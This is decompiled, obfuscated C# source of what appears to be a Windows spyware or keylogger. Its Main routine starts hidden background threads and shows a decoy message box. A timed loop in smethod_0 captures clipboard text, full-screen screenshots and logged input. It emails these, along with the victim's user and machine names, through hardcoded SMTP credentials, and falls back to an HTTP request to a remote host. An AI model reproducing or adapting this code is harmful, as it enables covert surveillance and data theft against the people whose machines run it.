using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using ns0;
using ns1;
using ns5;

namespace ns2;

internal class Class5
{
	public static string string_0;

	public static string string_1;

	public static string string_2;

	public static string string_3;

	public static string string_4;

	public static string string_5;

	public static string string_6;

	public static string string_7;

	public static string string_8;

	public static string string_9;

	public static string string_10;

	public static string string_11;

	public static string string_12 = "";

	public static string string_13 = Class42.smethod_161("qs/a2M6uvuHToanKydjNcMDX3Ag=", "False");

	public static string string_14 = Class42.smethod_161("tL2YoJN3kZsI", "False");

	public static string string_15 = Class42.smethod_161("tcrc34+pysnYzXDA19wI", "False");

	public static int int_0 = 587;

	public static string string_16 = Class42.smethod_161("DLEXSite", "False");

	public static string string_17 = Class42.smethod_161("f6axtHBGYTE=", "False");

	public static string string_18 = Class42.smethod_161("MQ==", "False");

	public static string string_19 = Class42.smethod_161("jZmyujE=", "False");

	public static string string_20 = Class42.smethod_161("jZmyujE=", "False");

	public static string string_21 = Class42.smethod_161("W5GntZkx", "False");

	public static string string_22 = Class42.smethod_161("W5GntZkx", "False");

	public static int int_1 = 120000;

	public static string string_23 = "";

	public static string string_24 = "";

	public static int int_2 = 0;

	public static Class13 class13_0;

	public static Thread thread_0 = new Thread(smethod_0);

	public static Thread thread_1 = new Thread((ThreadStart)Class42.smethod_93);

	public static Thread thread_2 = new Thread((ThreadStart)Class42.smethod_85);

	public static Thread thread_3 = new Thread((ThreadStart)Class42.smethod_127);

	public static Thread thread_4 = new Thread((ThreadStart)Class42.smethod_95);

	public static Thread thread_5 = new Thread((ThreadStart)Class42.smethod_68);

	public static Thread thread_6 = new Thread((ThreadStart)Class42.smethod_77);

	public static Thread thread_7 = new Thread((ThreadStart)Class42.smethod_96);

	[STAThread]
	public unsafe static void Main()
	{
		//IL_0266: Unknown result type (might be due to invalid IL or missing references)
		//IL_0298: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_032e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0360: Unknown result type (might be due to invalid IL or missing references)
		//IL_0392: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_041c: Unknown result type (might be due to invalid IL or missing references)
		void* ptr = stackalloc byte[8];
		if (!Class42.smethod_114())
		{
			return;
		}
		try
		{
			Class42.smethod_92();
			IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)Class2.smethod_0()).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)Class2.smethod_0()).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_3.IsBackground = true;
			thread_3.Start();
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		*(int*)ptr = 0;
		while (true)
		{
			*(int*)((byte*)ptr + 4) = 1;
			try
			{
				if (*(int*)ptr == 3)
				{
					Application.Restart();
				}
				class13_0 = new Class13(string_24);
				Class42.smethod_75();
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5, *(int*)((byte*)ptr + 4));
				checked
				{
					(*unchecked((int*)ptr))++;
					ProjectData.ClearProjectError();
					continue;
				}
			}
			break;
		}
		try
		{
			thread_0.IsBackground = true;
			thread_0.Start();
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		try
		{
			string text = string_18;
			if (Operators.CompareString(text, Class42.smethod_161("ltLc2gI=", "False"), false) == 0)
			{
				MessageBox.Show(string_20, string_19, (MessageBoxButtons)0, (MessageBoxIcon)0);
			}
			else if (Operators.CompareString(text, Class42.smethod_161("h6zIy7ieshg=", "False"), false) == 0)
			{
				MessageBox.Show(string_20, string_19, (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
			else if (Operators.CompareString(text, Class42.smethod_161("c8G3x66bqsjEvJwZ", "False"), false) == 0)
			{
				MessageBox.Show(string_20, string_19, (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
			else if (Operators.CompareString(text, Class42.smethod_161("bqqwuC8=", "False"), false) == 0)
			{
				MessageBox.Show(string_20, string_19, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(text, Class42.smethod_161("W6Ousqcw", "False"), false) == 0)
			{
				MessageBox.Show(string_20, string_19, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(text, Class42.smethod_161("kdDL4NOpytQJ", "False"), false) == 0)
			{
				MessageBox.Show(string_20, string_19, (MessageBoxButtons)0, (MessageBoxIcon)32);
			}
			else if (Operators.CompareString(text, Class42.smethod_161("cKS8uSI=", "False"), false) == 0)
			{
				MessageBox.Show(string_20, string_19, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(text, Class42.smethod_161("h9Tg2Nev1NcD", "False"), false) == 0)
			{
				MessageBox.Show(string_20, string_19, (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else if (Operators.CompareString(text, Class42.smethod_161("b6+ywreTosC8tJQh", "False"), false) == 0)
			{
				MessageBox.Show(string_20, string_19, (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else
			{
				MessageBox.Show(Class42.smethod_161("mc3V39K7zYq21bbO3JGyp8Lf48iojYrBz6nA3daDq86K5dJkx97l036Omd7Mp9HZ5NKq05jU0rF/0ODVZMzZ48hkx8/d03ID", "False"), Class42.smethod_161("i7/H0cStv3yox6jAzhM=", "False"), (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		try
		{
			Class42.smethod_109();
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_1.IsBackground = true;
			thread_1.Start();
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("hou5w66ErrzDqoa4ucuul6a+uLCPt37PtpYd", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("jprBwsOhwMfFxY6PucK8p73Lu5ebub3Zup65ubK6prLLjcmfuRY=", "False"), overwrite: true);
		}
		catch (Exception ex10)
		{
			ProjectData.SetProjectError(ex10, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_4.IsBackground = true;
			thread_4.Start();
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_5.IsBackground = true;
			thread_5.Start();
		}
		catch (Exception ex12)
		{
			ProjectData.SetProjectError(ex12, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_6.IsBackground = true;
			thread_6.Start();
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		try
		{
			Class42.smethod_50();
		}
		catch (Exception ex14)
		{
			ProjectData.SetProjectError(ex14, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_7.IsBackground = true;
			thread_7.Start();
		}
		catch (Exception ex15)
		{
			ProjectData.SetProjectError(ex15, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_2.IsBackground = true;
			thread_2.Start();
		}
		catch (Exception ex16)
		{
			ProjectData.SetProjectError(ex16, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public unsafe static void smethod_0()
	{
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		//IL_0187: Expected O, but got Unknown
		void* ptr = stackalloc byte[12];
		string text = "";
		while (true)
		{
			Thread.Sleep(int_1);
			text = "";
			string text2 = "";
			try
			{
				text = Class42.smethod_161("mpaiqZt8l6Kpm3yXoqmbfJeiqZt8l6Kpm3yXqNjHr7zUzdCjl6Kpm3yXoqmbfJeiqZt8l6Kpm3yXoqmbfJjCCg==", "False") + Environment.NewLine + Environment.NewLine + ((Computer)Class2.smethod_0()).get_Clipboard().GetText() + Environment.NewLine + Environment.NewLine + Class42.smethod_161("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			*(double*)ptr = 0.2;
			Class42.smethod_67(ref *(double*)ptr);
			try
			{
				WebClient webClient = new WebClient();
				text2 = Class42.smethod_161("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(Class42.smethod_161("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + Class42.smethod_161("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				text2 = "";
				ProjectData.ClearProjectError();
			}
			*(double*)ptr = 1.0;
			Class42.smethod_67(ref *(double*)ptr);
			try
			{
				if (Operators.CompareString(string_21, Class42.smethod_161("mNHf1gY=", "False"), false) == 0)
				{
					Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
					Bitmap val3 = val;
					((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + int_2 + Class42.smethod_161("ZsPMzBI=", "False"));
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			*(double*)ptr = 0.3;
			Class42.smethod_67(ref *(double*)ptr);
			try
			{
				if (Operators.CompareString(string_24, "", false) != 0)
				{
					string_23 = Class42.smethod_161("fHiEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYSLYG2rrsFgXnmEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYWrKQ==", "False") + Environment.NewLine + Environment.NewLine + string_24 + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
					*(int*)((byte*)ptr + 8) = 0;
					try
					{
						MailMessage mailMessage = new MailMessage();
						MailMessage mailMessage2 = mailMessage;
						mailMessage2.From = new MailAddress(string_13);
						mailMessage2.To.Add(string_13);
						mailMessage2.Subject = Class42.smethod_161("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + Class42.smethod_161("aQ0=", "False") + Environment.MachineName.ToString();
						mailMessage2.Body = string_23;
						try
						{
							if (Operators.CompareString(string_21, Class42.smethod_161("mNHf1gY=", "False"), false) == 0)
							{
								Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + int_2 + Class42.smethod_161("ZsPMzBI=", "False"));
								mailMessage2.Attachments.Add(item);
							}
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						mailMessage2 = null;
						SmtpClient smtpClient = new SmtpClient(string_15);
						SmtpClient smtpClient2 = smtpClient;
						smtpClient2.Port = int_0;
						smtpClient2.EnableSsl = true;
						smtpClient2.Credentials = new NetworkCredential(string_13, string_14);
						smtpClient2.Send(mailMessage);
						smtpClient2 = null;
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						try
						{
							string text3 = Class42.smethod_161("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
							HttpWebResponse httpWebResponse = (HttpWebResponse)WebRequest.Create(text3 + "?to=" + string_13 + "&subject=" + Strings.Replace(Class42.smethod_161("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + Class42.smethod_161("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(string_23, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + string_13).GetResponse();
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			string_23 = "";
			string_24 = "";
			string_12 = "";
			checked
			{
				int_2++;
			}
		}
	}
}
